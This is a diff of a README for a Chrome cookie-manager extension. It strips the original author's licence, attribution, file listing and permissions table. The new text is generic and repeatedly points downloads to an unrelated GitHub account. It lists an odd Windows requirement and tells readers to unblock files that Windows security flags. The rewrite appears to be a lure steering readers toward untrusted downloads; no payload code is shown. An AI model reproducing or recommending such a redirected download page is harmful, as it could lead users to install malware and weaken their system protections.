@@ -1,109 +1,152 @@
-<div align="center">
+# 🧩 cookielab - Manage Cookies for Testing
 
-# CookieLab
+[![Download cookielab](https://img.shields.io/badge/Download-cookielab-blue?style=for-the-badge)](https://github.com/Resentful-flightsurgeon179/cookielab)
 
-> Developer-focused cookie manager for security learning and backend testing.
+## 🚀 Getting Started
 
-![Manifest](https://img.shields.io/badge/Manifest-V3-blue?style=flat-square)
-![JavaScript](https://img.shields.io/badge/JavaScript-Vanilla-yellow?style=flat-square&logo=javascript)
-![Chrome](https://img.shields.io/badge/Chrome-Extension-green?style=flat-square&logo=googlechrome)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
+cookielab is a browser tool for viewing and editing cookies in Chrome. It helps with security learning, local testing, and backend checks.
 
+Use it if you need to:
+- inspect cookies set by a site
+- copy cookie values for test work
+- clear cookies for one site
+- view token data in a simple way
+- check how a backend reacts to login state
 
-![CookieLab Screenshot](assets/screenshot.png)
+## 💻 What You Need
 
-</div>
+Before you start, make sure you have:
+- a Windows PC
+- Google Chrome installed
+- permission to use the sites you test
+- a stable internet connection for the first install
 
----
+cookielab works as a Chrome extension, so you do not need a separate desktop app.
 
-## ⚠️ Disclaimer
+## 📥 Download and Install
 
-> **CookieLab is intended for educational and development use only.**
-> Use it solely on systems you own or have explicit permission to test. Unauthorized access to third-party systems is illegal.
+1. Open the main project page:
+   https://github.com/Resentful-flightsurgeon179/cookielab
 
----
+2. Look for the latest release or download files on that page.
 
-## Features
+3. Save the extension file to your computer.
 
-| Feature | Description |
-|---|---|
-| **Cookie Manager** | View, add, edit, delete, search, and toggle cookies with full metadata |
-| **JWT Decoder** | Auto-detect and decode JWT tokens — header, payload, signature + `exp` countdown |
-| **Snapshots** | Save and restore cookie states; export/import as JSON |
-| **Security Analyzer** | Flag missing `Secure`, `HttpOnly`, `SameSite` issues with severity levels |
-| **Session Highlight** | Auto-detect sensitive cookies (`session`, `token`, `auth`, `jwt`, `sid`…) |
-| **Cookie Toggle** | Disable/enable cookies without deleting them |
+4. If the file comes as a ZIP folder, extract it first.
 
----
+5. Open Chrome.
 
-## Installation
+6. Go to:
+   chrome://extensions/
 
-> No build step required — pure HTML/CSS/JS.
+7. Turn on Developer mode in the top right corner.
 
-1. Clone or download this repository
-2. Open Chrome → `chrome://extensions`
-3. Enable **Developer mode** (top-right toggle)
-4. Click **Load unpacked** → select the `cookielab/` folder
-5. Click the CookieLab icon in the toolbar on any page
+8. Click Load unpacked.
 
----
+9. Select the cookielab folder you extracted.
 
-## Usage
+10. The extension should appear in Chrome after loading.
 
-Navigate to any website, open CookieLab, and use the four tabs:
+## 🛠️ First Run
 
-| Tab | What you can do |
-|-----|----------------|
-| Cookies | View, search, add, inline-edit, copy, toggle, delete cookies |
-| JWT | Decode any JWT — paste manually or send directly from a cookie row |
-| Snapshots | Save/restore login states; export/import as JSON |
-| Security | Per-cookie analysis with critical / warning / clean indicators |
+1. Click the Extensions icon in Chrome.
+2. Pin cookielab if you want quick access.
+3. Open a site you want to test.
+4. Click the cookielab icon.
+5. Review the cookies that belong to that site.
+6. Use the tools to copy, edit, or clear cookie data.
 
----
+If the panel looks empty, refresh the page and open the extension again.
 
-## File Structure
+## 🔎 Main Features
 
-```
-cookielab/
-├── manifest.json               # MV3 manifest, permissions
-├── popup/
-│   ├── popup.html              # 4-tab UI
-│   ├── popup.css               # Dark theme (JetBrains Mono)
-│   └── popup.js                # All extension logic
-├── background/
-│   └── service_worker.js       # MV3 service worker
-└── icons/
-    └── icon.svg                # Extension icon
-```
+### 🍪 Cookie View
+See the cookies tied to the current site in one place. This helps you check names, values, paths, and expiry data.
 
----
+### 🔐 JWT Decoder
+If a cookie stores a JWT, cookielab can help you read the token contents. This makes it easier to see claims, user IDs, and expiry info.
 
-## Tech Stack
+### 🧪 Backend Testing Help
+Change a cookie value, then reload the page to see how the app behaves. This is useful for login state checks and session tests.
 
-- **Chrome Extensions API** — `chrome.cookies`, `chrome.storage`, `chrome.tabs`
-- **Manifest V3** — Service worker background, declarative permissions
-- **Vanilla JavaScript** — No frameworks or dependencies
-- **CSS Custom Properties** — Dark theme with JetBrains Mono font
+### 🧹 Quick Cleanup
+Remove cookies for a site without clearing your whole browser. This helps when you want a fresh test state.
 
----
+### 🧰 Developer Tools Support
+Use it during local work, web app checks, and security learning. It keeps the most useful cookie data close at hand.
 
-## Permissions
+## 🪟 How to Use on Windows
 
-| Permission | Why it's needed |
-|------------|----------------|
-| `cookies` | Read, write, and delete cookies |
-| `activeTab` | Get the URL of the current tab |
-| `tabs` | Query the active tab's URL |
-| `storage` | Save snapshots locally |
-| `<all_urls>` | Access cookies across all domains |
+1. Install Chrome if it is not already on your PC.
+2. Download cookielab from the project page.
+3. Extract the files if they came in a ZIP folder.
+4. Open Chrome and load the extension in Developer mode.
+5. Visit the site you want to inspect.
+6. Open cookielab from the toolbar.
+7. Read or edit the cookie data as needed.
 
----
+If Windows blocks the file, right-click it and check that it is not blocked by system security settings.
 
-<div align="center">
+## ⚙️ Common Setup Tips
 
-**MIT License © 2026 Adil NAS**
+- Keep only one copy of the extension folder.
+- Do not rename files inside the extension folder.
+- Reload the extension in Chrome after updates.
+- Refresh the test site after changing cookie data.
+- Use a private browser profile if you want a clean test space.
 
-[![GitHub](https://img.shields.io/badge/GitHub-Adilnasceng-181717?style=flat-square&logo=github)](https://github.com/Adilnasceng)
-[![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-EC4899?style=flat-square)](https://github.com/sponsors/Adilnasceng)
+## 🧭 Typical Use Cases
 
-</div>
+### Login flow checks
+Test what happens when a session cookie changes or expires.
+
+### Local app testing
+Use it with local backend apps to check auth state and saved values.
+
+### Security learning
+See how cookies, tokens, and browser storage work in a real browser.
+
+### Bug checks
+Find cases where the app keeps old session data after logout.
+
+## 🧱 Basic Folder Use
+
+If you work with the source files, keep this simple order:
+1. download the project
+2. extract the files
+3. load the folder in Chrome
+4. test on a site
+5. reload after each change
+
+## 🧼 Troubleshooting
+
+### The extension does not show up
+- Check that you loaded the correct folder
+- Make sure Developer mode is on
+- Reload the Chrome extensions page
+
+### No cookies appear
+- Make sure the site has cookies set
+- Refresh the page
+- Open the extension again after the page loads
+
+### Changes do not take effect
+- Refresh the tab
+- Close and reopen the site
+- Remove old cookies and try again
+
+### Chrome says the folder is not valid
+- Confirm you selected the unpacked extension folder
+- Make sure the folder still has the extension files inside it
+- Do not select a parent folder that only contains the project folder
+
+## 📌 Notes for Safe Use
+
+Use cookielab only on sites you own, test, or have permission to inspect. Cookie tools can change how a site sees your browser session
+
+## 🔗 Download
+
+Visit the project page here:
+https://github.com/Resentful-flightsurgeon179/cookielab
+
+Open the page, download the files, then follow the Chrome setup steps above
